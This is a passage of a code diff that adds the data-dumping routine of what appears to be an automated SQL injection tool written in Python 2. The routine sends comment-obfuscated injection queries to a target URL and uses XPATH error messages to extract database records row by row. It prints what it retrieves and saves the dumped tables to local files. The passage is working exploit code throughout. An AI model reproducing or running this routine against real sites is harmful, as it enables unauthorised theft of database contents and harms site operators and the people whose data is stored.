+                                                            ConnTimeOut()
+                                                            pass
+                                                        except KeyboardInterrupt:
+                                                            KeyBoardInterrupt()
+                                                            break
+                                                        else:
+                                                            try:
+                                                                respdata = resp.read()
+                                                                isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                                                if 'XPATH syntax error' in respdata:
+                                                                    dbvul = True
+                                                                    if '%20' in FinalDumpQuery_replaced:
+                                                                        testQuery = FinalDumpQuery_replaced.replace('%20','%%20')  
+                                                                    else:
+                                                                        testQuery = FinalDumpQuery_replaced
+                                                                    
+                                                                    if 'CONCAT/**_**/(/*!50000'+str(ColumnList[0])+'*/)' in testQuery:
+                                                                        DbDumpQuery = testQuery.replace('CONCAT/**_**/(/*!50000'+str(ColumnList[0])+'*/)','CONCAT/**_**/(/*!50000%s*/)')
+
+                                                                    elif 'CONCAT('+str(ColumnList[0])+')' in testQuery:
+                                                                        DbDumpQuery = testQuery.replace('CONCAT('+str(ColumnList[0])+')','CONCAT(%s)')
+                                                                        
+                                                                    else:
+                                                                        pass
+                                                                    
+                                                                    temp = 0
+                                                                    nor = int(no_of_recs)
+                                                                    infos += "Database: %s\n" % db
+                                                                    infos += "Table: %s\n" % tbl
+                                                                    infos += "["+str(nor)+" recs]\n"
+                                                                    tmp = ""
+                                                                    while temp < nor:
+                                                                        t = 0
+                                                                        for columns in ColumnList:
+                                                                            if 'LIMIT/**_**/0' in DbDumpQuery:
+                                                                                tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
+                                                                            elif 'LIMIT%%20' in DbDumpQuery:
+                                                                                tempQuery = DbDumpQuery.replace('LIMIT%%200','LIMIT%%20%d' % temp)
+                                                                            else:
+                                                                                tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)
+                                                                                
+                                                                            if 'LIMIT%20' in tempQuery:
+                                                                                tempQuery = tempQuery.replace('LIMIT%20','LIMIT%%20')
+                                                                            else:
+                                                                                tempQuery = tempQuery
+                                                                                
+                                                                            RecordsnumpQuery = tempQuery % (columns)
+                                                                            try:
+                                                                                req = Request(url, data=RecordsnumpQuery, headers={'User-agent':ua})
+                                                                                resp = urlopen(req, timeout=30)
+                                                                            except URLError as e:
+                                                                                URLError()
+                                                                                if temp == 0:
+                                                                                    temp = 0
+                                                                                else:
+                                                                                    temp = temp
+                                                                                sleep(1)
+                                                                                pass
+                                                                            except HTTPError as e:
+        ##                                                                        print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+                                                                                sleep(1)
+                                                                                pass
+                                                                            except (IOError, httplib.HTTPException) as e:
+                                                                                ConnTimeOut()
+                                                                                if temp == 0:
+                                                                                    temp = 0
+                                                                                else:
+                                                                                    temp = temp
+                                                                                pass
+                                                                            except KeyboardInterrupt:
+                                                                                print fw + sn + "Database: %s" % db
+                                                                                print fw + sn + "Table: %s" % tbl
+                                                                                print fw + sn + "["+str(temp)+" records]:"
+                                                                                print fw + sn + tmp
+                                                                                fd.write(dumps)
+                                                                                fd.close()
+                                                                                f.write(infos)
+                                                                                f.close()
+                                                                                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % PathToDumpedDb
+                                                                                KeyBoardInterrupt()
+                                                                                break
+                                                                            else:
+                                                                                try:
+                                                                                    respdata = resp.read()
+                                                                                    records = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                                                                    if 'XPATH syntax error' in respdata:
+                                                                                        print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % records
+                                                                                        infos += "[*] %s\n" % records
+                                                                                        dumps += "{},".format(records)
+                                                                                        tmp += "[*] %s\n" % records
+                                                                                        t += 1
+                                                                                        
+                                                                                except IndexError as e:
+                                                                                    pass
+                                                                                except Exception as e:
+                                                                                    pass
+                                                                                except KeyboardInterrupt:
+                                                                                   
+                                                                                    KeyBoardInterrupt()
+                                                                                    break  
+                                                                        check = len(ColumnList)
+                                                                        if t == check:
+                                                                            dumps += "\n"
+                                                                            temp += 1
+                                                                        else:
+                                                                            pass
+
+                                                                    print fw + sn + "Database: %s" % db
+                                                                    print fw + sn + "Table: %s" % tbl
+                                                                    print fw + sn + "["+str(nor)+" records]"
+                                                                    print fw + sn + tmp
+                                                                        
+                                                            except IndexError as e:
+                                                                pass
+                                                            except Exception as e:
+                                                                pass
+                                                            except KeyboardInterrupt:
+                                                                KeyBoardInterrupt()
+                                                                break
+                                                if dbvul:
+                                                    break
+                                except IndexError as e:
+                                    pass
+                                except Exception as e:
+                                    pass
+                                except KeyboardInterrupt:
+                                    KeyBoardInterrupt()
+                                    break
+                    if Query_Test:
+                        break
+                
+                f.write(infos)
+                fd.write(dumps)
+                fd.close()
+                f.close()
+                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % PathToDumpedDb
+            except Exception as e:
+                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % PathToDumpedDb
+                pass
             
     else:
         pass
@@ -6188,5 +6278,6 @@ def Main():
             
     else:
         pass
+
 if __name__ == "__main__":
 	Main()
